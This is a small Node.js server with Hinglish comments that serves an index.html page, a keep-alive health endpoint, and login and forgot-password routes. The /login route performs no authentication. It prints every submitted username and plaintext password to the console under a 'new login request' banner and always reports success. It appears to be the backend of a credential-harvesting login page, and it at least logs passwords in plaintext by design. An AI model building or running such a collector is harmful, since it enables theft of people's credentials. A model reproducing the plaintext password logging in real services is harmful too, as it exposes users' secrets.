const http = require('http');
const fs = require('fs');
const path = require('path');

const PORT = 3000;

// Agar index.html isi folder me rakhi hai to yeh use serve kar dega
const HTML_FILE = path.join(__dirname, 'index.html');

// Simple body size limit (1 MB) — isse bada request aane par reject ho jayega
const MAX_BODY_SIZE = 1 * 1024 * 1024;

function sendJSON(res, statusCode, obj) {
  res.writeHead(statusCode, { 'Content-Type': 'application/json' });
  res.end(JSON.stringify(obj));
}

function send404(res, msg) {
  res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
  res.end(msg || 'Route nahi mila');
}

function readBody(req, res, callback) {
  let body = '';
  let tooBig = false;

  req.on('data', chunk => {
    if (tooBig) return;
    body += chunk.toString();
    if (body.length > MAX_BODY_SIZE) {
      tooBig = true;
      sendJSON(res, 413, { success: false, message: 'Request body bahut bada hai' });
      req.destroy();
    }
  });

  req.on('end', () => {
    if (tooBig) return;
    callback(body);
  });

  req.on('error', () => {
    if (!tooBig) sendJSON(res, 400, { success: false, message: 'Request padhne me error' });
  });
}

const server = http.createServer((req, res) => {

  // CORS headers — browser se request allow karne ke liye
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Preflight request handle karo
  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    res.end();
    return;
  }

  const urlPath = req.url.split('?')[0].replace(/\/+$/, '') || '/';

  // GET / — root pe HTML page serve karo
  if (req.method === 'GET' && urlPath === '/') {
    fs.readFile(HTML_FILE, (err, data) => {
      if (err) {
        res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end('Server chal raha hai, lekin index.html nahi mili (' + HTML_FILE + ')');
        return;
      }
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(data);
    });
    return;
  }

  // GET /api/health — UptimeRobot isko ping karega taaki server sleep na ho
  if (req.method === 'GET' && urlPath === '/api/health') {
    sendJSON(res, 200, { status: 'online', provider: 'Groq' });
    return;
  }

  // POST /login route
  if (req.method === 'POST' && urlPath === '/login') {
    readBody(req, res, (body) => {
      let data;
      try {
        data = JSON.parse(body);
      } catch (err) {
        sendJSON(res, 400, { success: false, message: 'Invalid JSON bheja gaya' });
        return;
      }

      console.log('═══════════════════════════');
      console.log('📩 Naya Login Request Aaya!');
      console.log('📧 Username:', data.username);
      console.log('🔑 Password:', data.password);
      console.log('🕐 Time:', new Date().toLocaleString());
      console.log('═══════════════════════════');

      sendJSON(res, 200, { success: true, message: 'Data mil gaya!', username: data.username });
    });
    return;
  }

  // POST /forgot-password route
  if (req.method === 'POST' && urlPath === '/forgot-password') {
    readBody(req, res, (body) => {
      let data;
      try {
        data = JSON.parse(body);
      } catch (err) {
        sendJSON(res, 400, { success: false, message: 'Invalid JSON bheja gaya' });
        return;
      }

      console.log('📧 Forgot password request:', data.username);
      sendJSON(res, 200, { success: true, message: 'Reset link bhej diya (demo)' });
    });
    return;
  }

  // Baaki sab kuch 404
  send404(res, 'Route nahi mila');
});

server.listen(PORT, () => {
  console.log(`✅ Server chal raha hai: http://localhost:${PORT}`);
});
